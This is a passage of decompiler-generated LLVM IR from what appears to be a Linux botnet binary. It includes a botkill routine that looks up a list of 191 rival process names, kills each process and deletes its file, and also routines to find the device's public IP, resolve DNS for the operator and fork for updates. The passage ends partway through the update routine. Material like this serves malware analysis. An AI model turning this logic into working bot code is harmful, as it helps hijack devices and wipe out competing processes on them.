  %v0_80521499 = phi i32 [ %v15_805201d, %dec_label_pc_8052149.preheader ], [ %v1_8052146, %dec_label_pc_805213b ]
  %stack_var_-8.1.ph = phi i32 [ %tmp11, %dec_label_pc_8052149.preheader ], [ %stack_var_-8.0, %dec_label_pc_805213b ]
  %stack_var_-12.0.ph = phi i32 [ %tmp12, %dec_label_pc_8052149.preheader ], [ %v2_80520b2, %dec_label_pc_805213b ]
  br label %dec_label_pc_8052149.outer3

dec_label_pc_8052149.outer3:                      ; preds = %dec_label_pc_8052149.outer, %dec_label_pc_8052087
  %v0_80521498 = phi i32 [ %v0_80521499, %dec_label_pc_8052149.outer ], [ %v1_80520b7, %dec_label_pc_8052087 ]
  %stack_var_-12.0.ph4 = phi i32 [ %stack_var_-12.0.ph, %dec_label_pc_8052149.outer ], [ 0, %dec_label_pc_8052087 ]
  br label %dec_label_pc_8052149

dec_label_pc_8052149:                             ; preds = %dec_label_pc_8052149.outer3, %dec_label_pc_805205f
  %v0_8052149 = phi i32 [ %v0_80521498, %dec_label_pc_8052149.outer3 ], [ %v1_8052074, %dec_label_pc_805205f ]
  %v5_805214c = add i32 %v0_8052149, -16
  %v6_805214c = inttoptr i32 %v5_805214c to i32*
  store i32 %v2_805202b, i32* %v6_805214c, align 4
  %v0_805214f = call i32 @__GI_readdir()
  %v0_8052154 = load i32, i32* @esp, align 4
  %v4_805215a = icmp eq i32 %v0_805214f, 0
  %v1_805215e = icmp eq i1 %v4_805215a, false
  br i1 %v1_805215e, label %dec_label_pc_805205f, label %dec_label_pc_8052164

dec_label_pc_8052164:                             ; preds = %dec_label_pc_8052149
  %v6_8052167 = inttoptr i32 %v0_8052154 to i32*
  store i32 %v2_805202b, i32* %v6_8052167, align 4
  %v1_805216a = inttoptr i32 %v0_805214f to i32*
  %v2_805216a = call i32 @__GI_closedir(i32* %v1_805216a)
  br label %dec_label_pc_805217c

dec_label_pc_805217c:                             ; preds = %dec_label_pc_8052114, %dec_label_pc_8052040, %dec_label_pc_8052164
  %stack_var_-552.0 = phi i32 [ %v1_805206f, %dec_label_pc_8052114 ], [ -1, %dec_label_pc_8052164 ], [ -1, %dec_label_pc_8052040 ]
  %v2_8052182 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052182, i32* @ebp, align 4
  ret i32 %stack_var_-552.0

; uselistorder directives
  uselistorder i32 %v0_8052154, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805214f, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-8.1.ph, { 0, 1, 3, 2 }
  uselistorder i32 %v2_80520f4, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v0_80520de, { 0, 2, 1 }
  uselistorder i32 %v0_80520b7, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80520b2, { 1, 3, 0, 2, 4, 5, 6 }
  uselistorder i32 %v0_8052074, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v2_805202b, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-28, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_806915a.88 to i32), { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805217c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052149.outer, { 1, 0 }
}

define i32 @getexename() local_unnamed_addr {
entry:
  %stack_var_-524 = alloca i32, align 4
  %stack_var_-588 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052184 = load i32, i32* @ebp, align 4
  store i32 %v0_8052184, i32* %stack_var_-4, align 4
  %v4_8052184 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052184, i32* @ebp, align 4
  %v2_805219e = ptrtoint i32* %stack_var_-588 to i32
  %v4_80521a5 = call i32 @__GI_snprintf(i32 %v2_805219e, i32 64, i32 ptrtoint ([13 x i8]* @global_var_806a542.311 to i32))
  %v2_80521ad = icmp slt i32 %v4_80521a5, 0
  %v1_80521af = icmp eq i1 %v2_80521ad, false
  br i1 %v1_80521af, label %dec_label_pc_80521bd, label %dec_label_pc_8052228

dec_label_pc_80521bd:                             ; preds = %entry
  %v2_80521c0 = ptrtoint i32* %stack_var_-524 to i32
  %v4_80521d2 = call i32 @readlink(i32 %v2_805219e, i32 %v2_80521c0, i32 128)
  %v13_80521dd = icmp eq i32 %v4_80521d2, -1
  %v1_80521e1 = icmp eq i1 %v13_80521dd, false
  br i1 %v1_80521e1, label %dec_label_pc_80521ef, label %dec_label_pc_8052228

dec_label_pc_80521ef:                             ; preds = %dec_label_pc_80521bd
  %v5_80521f5 = icmp slt i32 %v4_80521d2, 128
  br i1 %v5_80521f5, label %dec_label_pc_805220e, label %dec_label_pc_80521f7

dec_label_pc_80521f7:                             ; preds = %dec_label_pc_80521ef
  %v1_80521f7 = call i32 @__errno_location(i32 %v4_80521d2)
  %v1_80521fc = inttoptr i32 %v1_80521f7 to i32*
  store i32 34, i32* %v1_80521fc, align 4
  br label %dec_label_pc_8052228

dec_label_pc_805220e:                             ; preds = %dec_label_pc_80521ef
  %v0_8052211 = load i32, i32* @ebp, align 4
  %v2_8052211 = mul i32 %v4_80521d2, 4
  %v3_8052211 = add i32 %v2_8052211, -520
  %v4_8052211 = add i32 %v3_8052211, %v0_8052211
  %v5_8052211 = inttoptr i32 %v4_8052211 to i32*
  store i32 0, i32* %v5_8052211, align 4
  br label %dec_label_pc_8052228

dec_label_pc_8052228:                             ; preds = %dec_label_pc_80521bd, %entry, %dec_label_pc_80521f7, %dec_label_pc_805220e
  %stack_var_-600.0 = phi i32 [ %v2_80521c0, %dec_label_pc_805220e ], [ 0, %dec_label_pc_80521f7 ], [ 0, %entry ], [ 0, %dec_label_pc_80521bd ]
  %v2_805222e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805222e, i32* @ebp, align 4
  ret i32 %stack_var_-600.0

; uselistorder directives
  uselistorder i32 %v4_80521d2, { 1, 2, 3, 0 }
  uselistorder i32 %v2_80521c0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052228, { 3, 2, 0, 1 }
}

define i32 @botkill() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i8*, align 4
  %stack_var_-12 = alloca i8*, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052230 = load i32, i32* @ebp, align 4
  store i32 %v0_8052230, i32* %stack_var_-4, align 4
  %v4_8052230 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052230, i32* @ebp, align 4
  %v15_8052233 = ptrtoint i32* %stack_var_-28 to i32
  store i8* inttoptr (i32 -1 to i8*), i8** %stack_var_-12, align 4
  %tmp13 = bitcast i8** %stack_var_-12 to i32*
  %tmp14 = bitcast i8** %stack_var_-16 to i32*
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052249

dec_label_pc_8052249:                             ; preds = %dec_label_pc_8052360, %entry
  %storemerge16 = phi i32 [ 0, %entry ], [ %v4_8052360, %dec_label_pc_8052360 ]
  %v0_805225315 = phi i32 [ %v15_8052233, %entry ], [ %v0_805237c6, %dec_label_pc_8052360 ]
  store i32 %storemerge16, i32* %eax.global-to-local, align 4
  %v1_805224c = mul nuw nsw i32 %storemerge16, 4
  %v2_805224c = add i32 %v1_805224c, ptrtoint ([191 x i8*]* @global_var_806f080.502 to i32)
  %v3_805224c = inttoptr i32 %v2_805224c to i32*
  %v4_805224c = load i32, i32* %v3_805224c, align 4
  store i32 %v4_805224c, i32* %eax.global-to-local, align 4
  %v2_8052256 = add i32 %v0_805225315, -12
  %v3_8052256 = inttoptr i32 %v2_8052256 to i32*
  store i32 %v4_805224c, i32* %v3_8052256, align 4
  %v1_8052257 = add i32 %v0_805225315, -16
  %v2_8052257 = inttoptr i32 %v1_8052257 to i32*
  store i32 ptrtoint ([22 x i8]* @global_var_806a54f.503 to i32), i32* %v2_8052257, align 4
  %v1_805225c = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  %v0_8052261 = load i32, i32* @esp, align 4
  store i32 %storemerge16, i32* %eax.global-to-local, align 4
  %v4_8052267 = load i32, i32* %v3_805224c, align 4
  store i32 %v4_8052267, i32* %eax.global-to-local, align 4
  %v3_8052271 = inttoptr i32 %v0_8052261 to i32*
  store i32 %v4_8052267, i32* %v3_8052271, align 4
  %v0_8052272 = call i32 @proc_find()
  store i32 %v0_8052272, i32* %eax.global-to-local, align 4
  %v0_8052277 = load i32, i32* @esp, align 4
  store i32 %v0_8052272, i32* %tmp13, align 4
  %v14_805227d = icmp eq i32 %v0_8052272, -1
  br i1 %v14_805227d, label %dec_label_pc_8052360, label %dec_label_pc_8052287

dec_label_pc_8052287:                             ; preds = %dec_label_pc_8052249
  store i32 %storemerge16, i32* %eax.global-to-local, align 4
  %v4_805228a = load i32, i32* %v3_805224c, align 4
  store i32 %v4_805228a, i32* %eax.global-to-local, align 4
  %v6_8052294 = add i32 %v0_8052277, 8
  %v7_8052294 = inttoptr i32 %v6_8052294 to i32*
  store i32 %v0_8052272, i32* %v7_8052294, align 4
  %v0_8052297 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052297 = add i32 %v0_8052277, 4
  %v3_8052297 = inttoptr i32 %v2_8052297 to i32*
  store i32 %v0_8052297, i32* %v3_8052297, align 4
  %v2_8052298 = inttoptr i32 %v0_8052277 to i32*
  store i32 ptrtoint ([24 x i8]* @global_var_806a565.504 to i32), i32* %v2_8052298, align 4
  %v0_805229d = load i8*, i8** %stack_var_-12, align 4
  %v3_805229d = call i32 (i8*, ...) @printf(i8* %v0_805229d)
  store i32 %v3_805229d, i32* %eax.global-to-local, align 4
  %v0_80522a2 = load i32, i32* @esp, align 4
  %v4_80522a8 = ptrtoint i8* %v0_805229d to i32
  %v7_80522a8 = inttoptr i32 %v0_80522a2 to i32*
  store i32 %v4_80522a8, i32* %v7_80522a8, align 4
  %v0_80522ab = call i32 @getexename()
  store i32 %v0_80522ab, i32* %eax.global-to-local, align 4
  %v0_80522b0 = load i32, i32* @esp, align 4
  %v1_80522b9 = add i32 %v0_80522b0, 4
  %v2_80522b9 = inttoptr i32 %v1_80522b9 to i32*
  store i32 9, i32* %v2_80522b9, align 4
  %v3_80522bb = load i8*, i8** %stack_var_-12, align 4
  %v4_80522bb = ptrtoint i8* %v3_80522bb to i32
  %v7_80522bb = inttoptr i32 %v0_80522b0 to i32*
  store i32 %v4_80522bb, i32* %v7_80522bb, align 4
  %v1_80522be = load i32, i32* %stack_var_-4, align 4
  %v2_80522be = call i32 @kill(i32 %v0_80522ab, i32 %v1_80522be)
  store i32 %v2_80522be, i32* %eax.global-to-local, align 4
  %v0_80522c3 = load i32, i32* @esp, align 4
  %v1_80522c6 = icmp eq i32 %v2_80522be, 0
  %v1_80522c8 = icmp eq i1 %v1_80522c6, false
  br i1 %v1_80522c8, label %dec_label_pc_80522d5, label %dec_label_pc_80522ca

dec_label_pc_80522ca:                             ; preds = %dec_label_pc_8052287
  %v0_80522ca = load i32, i32* @global_var_8074060.505, align 32
  %v1_80522cf = add i32 %v0_80522ca, 1
  store i32 %v1_80522cf, i32* %eax.global-to-local, align 4
  store i32 %v1_80522cf, i32* @global_var_8074060.505, align 32
  br label %dec_label_pc_80522d5

dec_label_pc_80522d5:                             ; preds = %dec_label_pc_8052287, %dec_label_pc_80522ca
  %v4_80522d5 = icmp eq i32 %v0_80522ab, 0
  store i32 %storemerge16, i32* %eax.global-to-local, align 4
  %v4_8052348 = load i32, i32* %v3_805224c, align 4
  store i32 %v4_8052348, i32* %eax.global-to-local, align 4
  br i1 %v4_80522d5, label %dec_label_pc_8052345, label %dec_label_pc_80522db

dec_label_pc_80522db:                             ; preds = %dec_label_pc_80522d5
  %v5_80522e8 = add i32 %v0_80522c3, 8
  %v6_80522e8 = inttoptr i32 %v5_80522e8 to i32*
  store i32 %v0_80522ab, i32* %v6_80522e8, align 4
  %v0_80522eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80522eb = add i32 %v0_80522c3, 4
  %v3_80522eb = inttoptr i32 %v2_80522eb to i32*
  store i32 %v0_80522eb, i32* %v3_80522eb, align 4
  %v2_80522ec = inttoptr i32 %v0_80522c3 to i32*
  store i32 ptrtoint ([32 x i8]* @global_var_806a580.506 to i32), i32* %v2_80522ec, align 4
  %v1_80522f1 = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  store i32 %v1_80522f1, i32* %eax.global-to-local, align 4
  %v0_80522f6 = load i32, i32* @esp, align 4
  %v6_80522fc = inttoptr i32 %v0_80522f6 to i32*
  store i32 %v0_80522ab, i32* %v6_80522fc, align 4
  %v0_80522ff = call i32 @remove()
  store i32 %v0_80522ff, i32* %eax.global-to-local, align 4
  %v0_8052304 = load i32, i32* @esp, align 4
  store i32 %v0_80522ff, i32* %tmp14, align 4
  %v5_805230a = icmp eq i32 %v0_80522ff, 0
  %v1_805230e = icmp eq i1 %v5_805230a, false
  %v5_8052333 = add i32 %v0_8052304, 4
  %v6_8052333 = inttoptr i32 %v5_8052333 to i32*
  store i32 %v0_80522ab, i32* %v6_8052333, align 4
  %v2_8052336 = inttoptr i32 %v0_8052304 to i32*
  br i1 %v1_805230e, label %dec_label_pc_8052330, label %dec_label_pc_8052310

dec_label_pc_8052310:                             ; preds = %dec_label_pc_80522db
  store i32 ptrtoint ([31 x i8]* @global_var_806a5a0.507 to i32), i32* %v2_8052336, align 4
  %v0_805231b = load i8*, i8** %stack_var_-16, align 4
  %v3_805231b = call i32 (i8*, ...) @printf(i8* %v0_805231b)
  %v0_8052320 = load i32, i32* @esp, align 4
  %v0_8052323 = load i32, i32* @global_var_8074064.508, align 4
  %v1_8052328 = add i32 %v0_8052323, 1
  store i32 %v1_8052328, i32* %eax.global-to-local, align 4
  store i32 %v1_8052328, i32* @global_var_8074064.508, align 4
  br label %dec_label_pc_8052360

dec_label_pc_8052330:                             ; preds = %dec_label_pc_80522db
  store i32 ptrtoint ([26 x i8]* @global_var_806a5bf.509 to i32), i32* %v2_8052336, align 4
  %v0_805233b = load i8*, i8** %stack_var_-16, align 4
  %v3_805233b = call i32 (i8*, ...) @printf(i8* %v0_805233b)
  store i32 %v3_805233b, i32* %eax.global-to-local, align 4
  %v0_8052340 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052360

dec_label_pc_8052345:                             ; preds = %dec_label_pc_80522d5
  %v2_8052352 = add i32 %v0_80522c3, 4
  %v3_8052352 = inttoptr i32 %v2_8052352 to i32*
  store i32 %v4_8052348, i32* %v3_8052352, align 4
  %v2_8052353 = inttoptr i32 %v0_80522c3 to i32*
  store i32 ptrtoint ([73 x i8]* @global_var_806a5dc.510 to i32), i32* %v2_8052353, align 4
  %v1_8052358 = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  store i32 %v1_8052358, i32* %eax.global-to-local, align 4
  %v0_805235d = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052360

dec_label_pc_8052360:                             ; preds = %dec_label_pc_8052249, %dec_label_pc_8052330, %dec_label_pc_8052310, %dec_label_pc_8052345
  %v0_805237c6.in = phi i32 [ %v0_8052277, %dec_label_pc_8052249 ], [ %v0_8052340, %dec_label_pc_8052330 ], [ %v0_8052320, %dec_label_pc_8052310 ], [ %v0_805235d, %dec_label_pc_8052345 ]
  %v0_805237c6 = add i32 %v0_805237c6.in, 16
  %v4_8052360 = add nuw nsw i32 %storemerge16, 1
  store i32 %v4_8052360, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8052360, 191
  br i1 %exitcond, label %dec_label_pc_8052371, label %dec_label_pc_8052249

dec_label_pc_8052371:                             ; preds = %dec_label_pc_8052360
  %v0_8052371 = load i32, i32* @global_var_8074064.508, align 4
  store i32 %v0_8052371, i32* %eax.global-to-local, align 4
  %v0_8052376 = load i32, i32* @global_var_8074060.505, align 32
  store i32 %v0_8052376, i32* %edx.global-to-local, align 4
  %v2_805237f = add i32 %v0_805237c6.in, 8
  %v3_805237f = inttoptr i32 %v2_805237f to i32*
  store i32 %v0_8052371, i32* %v3_805237f, align 4
  %v0_8052380 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052380 = add i32 %v0_805237c6.in, 4
  %v3_8052380 = inttoptr i32 %v2_8052380 to i32*
  store i32 %v0_8052380, i32* %v3_8052380, align 4
  %v2_8052381 = inttoptr i32 %v0_805237c6.in to i32*
  store i32 ptrtoint ([56 x i8]* @global_var_806a628.511 to i32), i32* %v2_8052381, align 4
  %v1_8052386 = call i32 (i8*, ...) @printf(i8* bitcast (i32* @0 to i8*))
  store i32 %v1_8052386, i32* %eax.global-to-local, align 4
  %v2_805238e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805238e, i32* @ebp, align 4
  ret i32 %v1_8052386

; uselistorder directives
  uselistorder i32* %v2_8052336, { 1, 0 }
  uselistorder i32 %v0_8052304, { 1, 0 }
  uselistorder i32 %v0_80522ff, { 1, 0, 2 }
  uselistorder i32 %v0_80522c3, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v0_8052277, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8052272, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge16, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-12, { 2, 3, 0, 1 }
  uselistorder i8** %stack_var_-16, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 23, 3, 7, 8, 9, 10, 4, 5, 6, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder label %dec_label_pc_8052360, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80522d5, { 1, 0 }
}

define i32 @cleanDevice(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805239c = call i32 @mfork(i32 %arg2)
  %v1_80523a4 = icmp eq i32 %v1_805239c, 0
  %v1_80523a6 = icmp eq i1 %v1_80523a4, false
  br i1 %v1_80523a6, label %dec_label_pc_80523e1, label %dec_label_pc_80523a8

dec_label_pc_80523a8:                             ; preds = %entry
  store i32 0, i32* @global_var_8074060.505, align 32
  store i32 0, i32* @global_var_8074064.508, align 4
  %v0_80523bc = call i32 @botkill()
  %v3_80523cf = call i32 @Send(i32 %arg1, i32 ptrtoint ([49 x i8]* @global_var_806a660.512 to i32))
  %v1_80523dc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80523e1

dec_label_pc_80523e1:                             ; preds = %entry, %dec_label_pc_80523a8
  %v0_80523e2 = phi i32 [ %v1_805239c, %entry ], [ %v1_80523dc, %dec_label_pc_80523a8 ]
  ret i32 %v0_80523e2

; uselistorder directives
  uselistorder label %dec_label_pc_80523e1, { 1, 0 }
}

define i32 @dns2ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_80523ef = call i32 @mfork(i32 %arg2)
  %v1_80523f7 = icmp eq i32 %v1_80523ef, 0
  %v1_80523f9 = icmp eq i1 %v1_80523f7, false
  br i1 %v1_80523f9, label %dec_label_pc_8052482, label %dec_label_pc_80523ff

dec_label_pc_80523ff:                             ; preds = %entry
  %v12_80523ff = icmp eq i32 %arg3, 1
  %v1_8052403 = icmp eq i1 %v12_80523ff, false
  br i1 %v1_8052403, label %dec_label_pc_8052462, label %dec_label_pc_8052405

dec_label_pc_8052405:                             ; preds = %dec_label_pc_80523ff
  %v1_8052408 = add i32 %arg4, 4
  %v1_805240b = inttoptr i32 %v1_8052408 to i32*
  %v2_805240b = load i32, i32* %v1_805240b, align 4
  %v1_8052411 = call i32 @__GI_gethostbyname(i32 %v2_805240b)
  %v1_8052419 = add i32 %v1_8052411, 16
  %v2_8052419 = inttoptr i32 %v1_8052419 to i32*
  %v3_8052419 = load i32, i32* %v2_8052419, align 4
  %v1_805241c = inttoptr i32 %v3_8052419 to i32*
  %v2_805241c = load i32, i32* %v1_805241c, align 4
  %v1_8052421 = inttoptr i32 %v2_805241c to i32*
  %v2_8052421 = load i32, i32* %v1_8052421, align 4
  %v1_8052423 = call i32 @__GI_inet_ntoa(i32 %v2_8052421)
  %v4_8052435 = bitcast i32* %stack_var_-20 to i8*
  %v5_8052435 = call i32 @strncpy(i8* %v4_8052435, i32 %v1_8052423, i32 16)
  %v3_8052458 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806a691.513 to i32))
  br label %dec_label_pc_8052478

dec_label_pc_8052462:                             ; preds = %dec_label_pc_80523ff
  %v3_8052470 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806a6af.514 to i32))
  br label %dec_label_pc_8052478

dec_label_pc_8052478:                             ; preds = %dec_label_pc_8052405, %dec_label_pc_8052462
  %v1_805247d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8052482

dec_label_pc_8052482:                             ; preds = %entry, %dec_label_pc_8052478
  %v0_8052483 = phi i32 [ %v1_80523ef, %entry ], [ %v1_805247d, %dec_label_pc_8052478 ]
  ret i32 %v0_8052483

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052482, { 1, 0 }
  uselistorder label %dec_label_pc_8052478, { 1, 0 }
}

define i32 @isValidIpAddress(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v15_8052490 = ptrtoint i32* %stack_var_-20 to i32
  %v3_8052499 = inttoptr i32 %arg1 to i8*
  %v4_8052499 = call i32 @inet_pton(i32 2, i8* %v3_8052499, i32 %v15_8052490)
  ret i32 %v4_8052499
}

define i32 @getPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_80524b8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_80524d1 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80524d5 = call i32 @__GI_snprintf(i32 %v2_80524d1, i32 16, i32 %arg1)
  %v3_80524ec = call i32 @ioctl(i32 %v3_80524b8, i32 35093, i32 %v2_80524d1)
  %v1_8052500 = call i32 @__GI_inet_ntoa(i32 %tmp)
  store i32 %v1_8052500, i32* @eax, align 4
  %v2_8052508 = ptrtoint i32* %stack_var_-104 to i32
  %v2_8052510 = bitcast i32* %stack_var_-104 to i8*
  %v3_8052510 = call i32 @strcpy(i8* %v2_8052510, i32 %v1_8052500)
  %v1_805251e = call i32 @close(i32 %v3_80524b8)
  ret i32 %v2_8052508

; uselistorder directives
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 7, 6, 5, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__GI_snprintf, { 3, 2, 0, 1 }
}

define i32 @getip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v8_8052533 = icmp eq i32 %arg3, 0
  store i1 %v8_8052533, i1* %cf.global-to-local, align 1
  %v12_8052533 = icmp eq i32 %arg3, 1
  br i1 %v12_8052533, label %dec_label_pc_8052554, label %dec_label_pc_8052539

dec_label_pc_8052539:                             ; preds = %entry
  %v5_8052539 = icmp ult i32* %stack_var_-28, inttoptr (i32 4 to i32*)
  store i1 %v5_8052539, i1* %cf.global-to-local, align 1
  %v3_8052547 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806a6cb.515 to i32))
  %v0_805254c = load i32, i32* @esp, align 4
  %v2_805254c = icmp ugt i32 %v0_805254c, -17
  store i1 %v2_805254c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80525e4

dec_label_pc_8052554:                             ; preds = %entry
  %v1_8052557 = add i32 %arg4, 4
  %v1_805255a = inttoptr i32 %v1_8052557 to i32*
  %v2_805255a = load i32, i32* %v1_805255a, align 4
  %v5_805255c = icmp ult i32* %stack_var_-28, inttoptr (i32 12 to i32*)
  store i1 %v5_805255c, i1* %cf.global-to-local, align 1
  %v1_8052560 = call i32 @getPublicIP(i32 %v2_805255a)
  store i1 %v5_805255c, i1* %cf.global-to-local, align 1
  %v1_805256c = call i32 @isValidIpAddress(i32 %v1_8052560)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8052574 = icmp eq i32 %v1_805256c, 0
  br i1 %v1_8052574, label %dec_label_pc_80525e4, label %dec_label_pc_8052578

dec_label_pc_8052578:                             ; preds = %dec_label_pc_8052554
  %v2_805257e = load i32, i32* %v1_805255a, align 4
  store i1 %v5_805255c, i1* %cf.global-to-local, align 1
  %v1_8052584 = call i32 @getPublicIP(i32 %v2_805257e)
  %v0_8052589 = load i32, i32* @esp, align 4
  %v2_8052589 = icmp ugt i32 %v0_8052589, -17
  store i1 %v2_8052589, i1* %cf.global-to-local, align 1
  store i1 false, i1* @df, align 1
  %v4_805259e = inttoptr i32 %v1_8052584 to i8*
  store i32 %v1_8052584, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_806a6e9.516 to i32), i32* @edi, align 4
  %v7_80525a7 = call i32 @_strncmp(i8* %v4_805259e, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806a6e9.516, i32 0, i32 0), i32 3)
  %v8_80525a7 = urem i32 %v7_80525a7, 2
  %v9_80525a7 = icmp eq i32 %v8_80525a7, 0
  %v0_80525a9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80525a9 = or i1 %v0_80525a9, %v9_80525a7
  %v3_80525a9 = zext i1 %v2_80525a9 to i8
  %v7_80525a9 = xor i8 %v3_80525a9, 1
  %v3_80525b1 = zext i1 %v0_80525a9 to i8
  %v4_80525b1 = sub nsw i8 %v7_80525a9, %v3_80525b1
  %v15_80525b1 = icmp eq i8 %v4_80525b1, 0
  %v2_80525b5 = sext i8 %v4_80525b1 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_80525b1, label %dec_label_pc_80525e4, label %dec_label_pc_80525bc

dec_label_pc_80525bc:                             ; preds = %dec_label_pc_8052578
  %v2_80525c2 = load i32, i32* %v1_805255a, align 4
  %v0_80525c4 = load i32, i32* @esp, align 4
  %v5_80525c4 = icmp ult i32 %v0_80525c4, 12
  store i1 %v5_80525c4, i1* %cf.global-to-local, align 1
  %v1_80525c8 = call i32 @getPublicIP(i32 %v2_80525c2)
  %v0_80525cd = load i32, i32* @esp, align 4
  %v2_80525cd = icmp ugt i32 %v0_80525cd, -17
  store i1 %v2_80525cd, i1* %cf.global-to-local, align 1
  %v3_80525dc = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_806a6ed.517 to i32))
  %v0_80525e1 = load i32, i32* @esp, align 4
  %v2_80525e1 = icmp ugt i32 %v0_80525e1, -17
  store i1 %v2_80525e1, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_80525e4

dec_label_pc_80525e4:                             ; preds = %dec_label_pc_8052578, %dec_label_pc_8052554, %dec_label_pc_8052539, %dec_label_pc_80525bc
  %v0_80525ea = phi i32 [ %v2_80525b5, %dec_label_pc_8052578 ], [ 0, %dec_label_pc_8052554 ], [ %v3_8052547, %dec_label_pc_8052539 ], [ %v3_80525dc, %dec_label_pc_80525bc ]
  ret i32 %v0_80525ea

; uselistorder directives
  uselistorder i1 %v0_80525a9, { 1, 0 }
  uselistorder i32 %v1_8052584, { 1, 0 }
  uselistorder i1 %v5_805255c, { 2, 0, 1 }
  uselistorder i32 (i32)* @getPublicIP, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80525e4, { 3, 0, 1, 2 }
}

define i32 @update(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-5260 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80525ef = load i32, i32* @esi, align 4
  store i32 %v0_80525ef, i32* %stack_var_-12, align 4
  %v2_80525f0 = icmp ult i32* %stack_var_-12, inttoptr (i32 5248 to i32*)
  store i1 %v2_80525f0, i1* %cf.global-to-local, align 1
  %v12_80525f0 = ptrtoint i32* %stack_var_-5260 to i32
  %v1_80525f6 = call i32 @__libc_getpid(i32 %v0_80525ef)
  store i32 %v1_80525f6, i32* @eax, align 4
  %v0_80525fe = load i32, i32* @esp, align 4
  %v5_80525fe = icmp ult i32 %v0_80525fe, 12
  store i1 %v5_80525fe, i1* %cf.global-to-local, align 1
  %v2_8052604 = call i32 @mfork(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805260c = icmp eq i32 %v2_8052604, 0
  %v1_805260e = icmp eq i1 %v1_805260c, false
  br i1 %v1_805260e, label %dec_label_pc_8052dc6, label %dec_label_pc_8052614

dec_label_pc_8052614:                             ; preds = %entry
  %v4_8052614 = add i32 %arg3, -1
  %v8_8052614 = icmp eq i32 %arg3, 0
  %v9_8052614 = sub i32 0, %arg3
  %v10_8052614 = and i32 %arg3, %v9_8052614
  %v11_8052614 = icmp slt i32 %v10_8052614, 0
  store i1 %v8_8052614, i1* %cf.global-to-local, align 1
